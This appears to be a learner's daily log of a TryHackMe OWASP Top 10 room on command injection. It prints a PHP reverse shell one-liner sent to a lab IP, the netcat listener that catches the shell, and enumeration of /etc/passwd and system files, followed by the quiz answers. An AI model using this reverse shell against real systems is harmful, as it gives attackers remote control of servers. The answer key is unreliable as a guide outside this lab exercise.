
#	Day 27

#### 07-02-2022

# TryHackMe Rank  34530 ( 59 Streak )


#  OWASP Top 10
[TryHackMe OWASP Top 10](https://tryhackme.com/room/owasptop10)


1.    Injection
2.    Broken Authentication
3.    Sensitive Data Exposure
4.    XML External Entity
5.    Broken Access Control
6.    Security Misconfiguration
7.    Cross-site Scripting
8.    Insecure Deserialization
9.    Components with Known Vulnerabilities
10.   Insufficent Logging & Monitoring

---
#	1.    Injection

-	Injection flaws are very common in applications today.
-	These flaws occur because user controlled input is interpreted as actual commands or parameters by the application.
-	Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies.
-	Some common examples include:

	-	SQL Injection: This occurs when user controlled input is passed to SQL queries.
-
-	As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.

-	Command Injection:

	-	This occurs when user input is passed to system commands.
	-	As a result, an attacker is able to execute arbitrary system commands on application servers.


	What is Active Command Injection?


	-	Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.
	-	Active command injection will return the response to the user.  It can be made visible through several HTML elements.

	-	Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.
	-	It's nowhere near finished but contains the same command injection vulnerability as before!  But this time, the response from the system call can be seen on the page!  They'll never learn!

---
Q1.	What strange text file is in the website root directory?

```
	IP = use ip a and get tnu0

	Syntax for reverse shell in php
	php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash  -i <&3 >&3 2>&3");'


	enter this code in any input field
	php -r '$sock=fsockopen("10.9.1.196",5555);exec("/bin/bash  -i <&3 >&3 2>&3");'



	└─╼ $ sudo  nc -lvp 5555

	listening on [any] 5555 ...
	10.10.208.90: inverse host lookup failed: Unknown host
	connect to [10.9.1.196] from (UNKNOWN) [10.10.208.90] 53570
	bash: cannot set terminal process group (974): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@injection:/var/www/html$ ls
	ls
	css
	drpepper.txt
	evilshell.php
	index.php
	js

```

###	Ans: drpepper.txt
---
Q2.	How many non-root/non-service/non-daemon users are there?

```
www-data@injection:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin

```
### Ans: 0
---
Q3.	What user is this app running as?

```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

```
---
###	Ans:	www-data

Q4.	What is the user's shell set as?

```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

```
###	Ans :	/usr/sbin/nologin
---
Q4.	What version of Ubuntu is running?

```
Way -1
www-data@injection:/var/www/html$ cat /proc/version
cat /proc/version
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020


Way -2
www-data@injection:/var/www/html$ uname -a
uname -a
Linux injection 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

Way -3 (recommand)

www-data@injection:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

```
###	Ans:	18.04.4

---
Q5.	Print out the MOTD.  What favorite beverage is shown?

MOTD	 Message of the data
```
www-data@injection:/var/www/html$ cd /etc
cd /etc
www-data@injection:/etc$ ls | grep "motd"
ls | grep "motd"
update-motd.d
www-data@injection:/etc$ cd update-motd.d
cd update-motd.d
www-data@injection:/etc/update-motd.d$ ls
ls
00-header
10-help-text
50-landscape-sysinfo
50-motd-news
80-esm
80-livepatch
90-updates-available
91-release-upgrade
92-unattended-upgrades
95-hwe-eol
97-overlayroot
98-fsck-at-reboot
98-reboot-required
www-data@injection:/etc/update-motd.d$ cat 00-header
cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

DR PEPPER MAKES THE WORLD TASTE BETTER!

```
###	Ans : DR PEPPER

---